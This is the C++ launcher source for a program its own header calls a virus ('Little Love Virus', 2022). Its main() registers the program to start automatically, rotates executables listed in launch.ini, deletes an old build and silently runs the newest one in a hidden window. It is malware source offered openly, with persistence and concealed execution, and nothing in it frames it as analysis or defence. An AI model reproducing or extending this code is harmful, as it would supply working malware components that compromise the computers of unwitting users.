/*
Little Love Virus
Yellow Eel special version
By wurenji,2022
launcher:main.cpp
The main() of the virus launcher.
*/

#include"std.h"
#include"hide.h"
#include"func.h"

int _tmain(int argc, TCHAR* argv[])
{
	RegAutoStart();
	std::wfstream wfs(_T("launch.ini"), std::ios::in);
	std::wstring lastbuildnum, oldbuildnum;
	wfs >> lastbuildnum >> oldbuildnum;
	if(oldbuildnum==_T("0"))
	{
		wfs.close();
		_tremove((oldbuildnum + _T(".exe")).c_str());
		wfs.open(_T("launch.ini"), std::ios::out);
		wfs << lastbuildnum << '\n' << 0 << std::flush;
	}
	wfs.close();
	ShellExecute(NULL, _T("open"), (lastbuildnum+_T(".exe")).c_str(), _T("/c /r"), NULL, SW_HIDE);
	return 0;
}